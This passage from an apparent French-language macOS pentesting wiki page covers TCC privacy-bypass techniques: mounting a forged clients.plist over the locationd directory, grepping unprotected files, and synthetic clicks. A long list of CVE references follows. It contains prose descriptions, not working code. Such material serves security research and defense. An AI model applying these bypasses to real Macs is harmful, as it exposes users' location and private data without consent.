Le fichier `clients.plist` est lui-même protégé par Sandbox/TCC et ne peut pas être modifié, même en tant que root — mais **le répertoire `/var/db/locationd/` n’était pas protégé contre le montage**. Un attaquant disposant des privilèges root pouvait donc créer une image disque contenant son propre `clients.plist` (avec son binaire marqué comme `Authorized`), la monter par-dessus le répertoire, puis redémarrer `locationd` pour appliquer la liste d’autorisations falsifiée.<sup>[[3]](#references)</sup>

> [!TIP]
> C’est le même principe que pour les contournements TCC avec `hdiutil`/`mount` ci-dessus : le *fichier* est protégé, mais pas le *répertoire qui le contient*. On remplace donc le répertoire entier plutôt que le fichier.

## Par les apps lancées au démarrage


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Par grep

Dans plusieurs cas, des fichiers stockent des informations sensibles, comme des adresses e-mail, des numéros de téléphone ou des messages, dans des emplacements non protégés (ce qui constitue une vulnérabilité selon Apple).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Cela ne fonctionne plus, mais [**ça fonctionnait par le passé**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)** :**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Une autre méthode utilisant les [**événements CoreGraphics**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf) :<sup>[[17]](#references)</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>



## References

- [1] [CVE-2020–9934 : contournement du framework Transparency, Consent, and Control (TCC) de macOS](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [Contournement accidentel et intentionnel des protections de la vie privée de macOS TCC](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [CVE-2022-22655 - Contournement des services de localisation TCC (rapport original)](https://theevilbit.github.io/posts/cve-2022-22655/)
- [4] [Où est donc Carmen Sandiego ? Abus des services de localisation sur macOS](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [5] [Jamf Threat Labs - CVE-2024-44131 : un contournement de TCC vole des données depuis iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [SQLite - `test_sqllog.c` (variables d’environnement SQLITE_ENABLE_SQLLOG)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [7] [Apple - Autorisation des variables d’environnement DYLD](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [8] [The Eclectic Light Company - Notarisation : le runtime renforcé](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [9] [Un contournement zero-day de TCC découvert dans le malware XCSSET](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [10] [OBTS v5.0 : « Ce qui se passe sur votre Mac reste-t-il dans iCloud d’Apple ?! » - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [11] [Une nouvelle vulnérabilité macOS, « powerdir », pourrait permettre un accès non autorisé aux données des utilisateurs](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [12] [Modifier le répertoire personnel et contourner TCC, alias CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [13] [Lancer la musique et contourner TCC, alias CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [14] [Comment dépouiller un renard (Firefox)](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [15] [CVE-2023-26818 - Contournement de TCC avec Telegram sur macOS](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [16] [Kandji - Découverte des vulnérabilités Apple : audit de diskarbitrationd et storagekitd, partie 2](https://www.kandji.io/blog/macos-audit-story-part2)
- [17] [Patrick Wardle - Objective by the Sea v2.0 : Synthetic Clicks et CoreGraphics Event Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)
- [18] [breakpointHQ/TCC-ClickJacking - preuve de concept](https://github.com/breakpointHQ/TCC-ClickJacking)
- [19] [Stack Overflow - Définir des variables d’environnement sur OS X](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)
- [20] [theevilbit - CVE-2020-9771 : contournement TCC et élévation de privilèges via mount_apfs](https://theevilbit.github.io/posts/cve_2020_9771/)
- [21] [theevilbit - CVE-2021-30808 : contournement de TCC par montage par-dessus la base de données TCC](https://theevilbit.github.io/posts/cve-2021-30808/)
- [22] [Plus de 20 façons de contourner les mécanismes de confidentialité de macOS](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [23] [Victoire écrasante contre TCC - Plus de 20 nouvelles façons de contourner les mécanismes de confidentialité de macOS](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [24] [De Spotlight à Apple Intelligence — Abus d’un 0day pour voler les données qui alimentent l’IA de macOS](https://objective-see.org/blog/blog_0x81.html)
{{#include ../../../../../banners/hacktricks-training.md}}
